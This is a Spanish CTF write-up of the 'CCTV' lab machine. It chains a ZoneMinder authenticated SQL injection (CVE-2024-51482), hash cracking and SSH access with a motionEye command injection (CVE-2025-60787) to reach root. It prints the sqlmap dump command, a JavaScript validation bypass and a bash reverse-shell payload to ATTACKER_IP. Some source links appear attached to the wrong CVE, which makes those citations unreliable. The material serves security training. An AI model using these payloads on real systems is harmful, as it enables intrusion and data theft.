
# CCTV — Technical Writeup (Resumen)

## 1. Introduction

Se compromete la máquina **CCTV**, un Linux que expone un stack de videovigilancia basado en **ZoneMinder** y **motionEye**.  
La cadena de ataque combina enumeración de servicios, explotación de una **SQLi autenticada** en ZoneMinder (**CVE‑2024‑51482**) y una **RCE por command injection** en motionEye (**CVE‑2025‑60787**) para obtener acceso inicial y privilegios de root. [advisories.gitlab](https://advisories.gitlab.com/pkg/pypi/motioneye/CVE-2025-60787/)

***

## 2. Recon & Service Enumeration

Se realiza un escaneo completo de puertos sobre la IP de la máquina.

```bash
nmap -p- --min-rate 5000 -sS 10.129.X.X
```

Puertos abiertos:

- 22/tcp – SSH (OpenSSH 9.6p1, Ubuntu).  
- 80/tcp – HTTP (Apache 2.4.58). [radar.offseq](https://radar.offseq.com/threat/motioneye-0431b4-rce-f554aa8d)

El escaneo con scripts y detección de versiones confirma un servidor Linux con Apache y OpenSSH recientes, por lo que el foco se centra en la aplicación web de CCTV.

***

## 3. Web Enumeration & ZoneMinder

La web en el puerto 80 presenta el sitio de una empresa de CCTV y un portal de **ZoneMinder** accesible en `/zm/`, identificado como versión 1.37.63, vulnerable a **CVE‑2024‑51482**. [exploit-db](https://www.exploit-db.com/exploits/52481)

Se prueban credenciales por defecto y se consigue acceso al panel de administración:

- `admin:admin`

Con la sesión autenticada se captura la cookie `ZMSESSID` desde el navegador para reutilizarla con herramientas automatizadas.

***

## 4. SQL Injection — CVE‑2024‑51482

ZoneMinder ≤ 1.37.64 es vulnerable a SQLi ciega basada en tiempo en el parámetro `tid` del endpoint:

`/zm/index.php?view=request&request=event&action=removetag&tid=` [advisories.gitlab](https://advisories.gitlab.com/pkg/pypi/motioneye/CVE-2025-60787/)

Se lanza **sqlmap** usando la cookie de sesión:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  -D zm -T Users -C Username,Password \
  --dump --batch --dbms=MySQL \
  --technique=T \
  --cookie="ZMSESSID=<SESSION_ID>"
```

La inyección devuelve hashes `bcrypt` de usuarios, incluyendo `mark`.  
Se extrae el hash de `mark` a un fichero y se crackea con **hashcat** (modo 3200, bcrypt) y `rockyou.txt`, obteniendo la contraseña en texto claro, reutilizable para SSH.

***

## 5. Initial Access (SSH)

Con las credenciales de `mark` se establece acceso SSH:

```bash
ssh mark@cctv.htb
```

Se confirma que `mark` es un usuario sin privilegios especiales (no `sudo`, grupos básicos).  
Se enumeran puertos internos:

```bash
ss -tlnp
```

Servicios locales interesantes:

- 8765 – **motionEye** (web UI).  
- 9081 – stream MJPEG.  
- 8554 – RTSP.  
- 3306 – MySQL.  
- 7999 – web control de motion. [radar.offseq](https://radar.offseq.com/threat/motioneye-0431b4-rce-f554aa8d)

***

## 6. Internal Service Exposure (Port Forwarding)

Como motionEye sólo escucha en `127.0.0.1:8765`, se usa forward de SSH desde la máquina del atacante:

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

Desde el navegador del atacante se accede a:

`http://127.0.0.1:8765/`

Este portal corresponde a **motionEye**. [mpolinowski.github](https://mpolinowski.github.io/docs/Automation_and_Robotics/Home_Automation/2019-02-07--motioneye-on-debian/2019-02-07/)

En el sistema se localiza la configuración:

```bash
cat /etc/motioneye/motion.conf
```

En ese fichero aparecen comentarios con el usuario admin y el hash SHA‑1 del password, así como la referencia a `camera-1.conf`.  
En `camera-1.conf` se observa:

```text
stream_authentication user:
...
picture_filename %Y-%m-%d-%H-%M-%S
```

La línea `stream_authentication user:` implica usuario `user` con contraseña vacía, que permite autenticarse en motionEye como usuario válido. [github](https://github.com/ccrisan/motioneye/wiki/Configuration-File)

***

## 7. Privilege Escalation — motionEye RCE (CVE‑2025‑60787)

Versions ≤ 0.43.1b4 de motionEye son vulnerables a **command injection** en parámetros de configuración (p. ej. nombre de fichero de imagen), porque los valores se escriben en los `camera-*.conf` sin sanitización y el proceso **motion** los evalúa como parte del pipeline de shell al recargar. [nvd.nist](https://nvd.nist.gov/vuln/detail/CVE-2025-60787)

### 7.1 Bypass de validación cliente

motionEye aplica validación sólo en JavaScript.  
Se abre la consola del navegador (DevTools) en el panel y se ejecuta:

```javascript
configUiValid = function() { return true; };
```

Cualquier valor pasa la validación de formularios. [github](https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j945-qm58-4gjx)

### 7.2 Payload en Image File Name

En la configuración de la cámara (Still Images → Image File Name) se introduce un payload que inyecta shell:

```text
$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1').%Y-%m-%d-%H-%M-%S
```

Se levanta un listener:

```bash
nc -lvnp 4444
```

Al aplicar los cambios, motion recarga la configuración y ejecuta el comando embebido, estableciendo un **reverse shell como root** (usuario bajo el que corre motionEye en este escenario). [rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/motioneye_auth_rce_cve_2025_60787/)

***

## 8. Post-Exploitation & Flags

Con shell de alto privilegio (root dentro del entorno principal) se localizan y leen las flags:

```bash
# User
cat /home/mark/user.txt

# Root
cat /root/root.txt
```

Se pueden además revisar las configuraciones de Docker, los bridges internos y el stack completo de CCTV para un análisis post‑mortem de seguridad.

***

## 9. Tools & CVEs

| Tool        | Purpose                           |
|------------|-----------------------------------|
| **Nmap**   | Recon y enumeración de puertos    |
| **sqlmap** | Explotación de SQLi en ZoneMinder |
| **hashcat**| Cracking de hashes bcrypt         |
| **SSH**    | Acceso remoto y port forwarding   |
| **netcat** | Reverse shell listener            |
| Browser DevTools | Bypass JS validation en motionEye |

Vulnerabilidades clave:

- **CVE‑2024‑51482** – SQLi en ZoneMinder (parámetro `tid`). [advisories.gitlab](https://advisories.gitlab.com/pkg/pypi/motioneye/CVE-2025-60787/)
- **CVE‑2025‑60787** – command injection en parámetros de configuración de motionEye (como `image_file_name`). [exploit-db](https://www.exploit-db.com/exploits/52481)

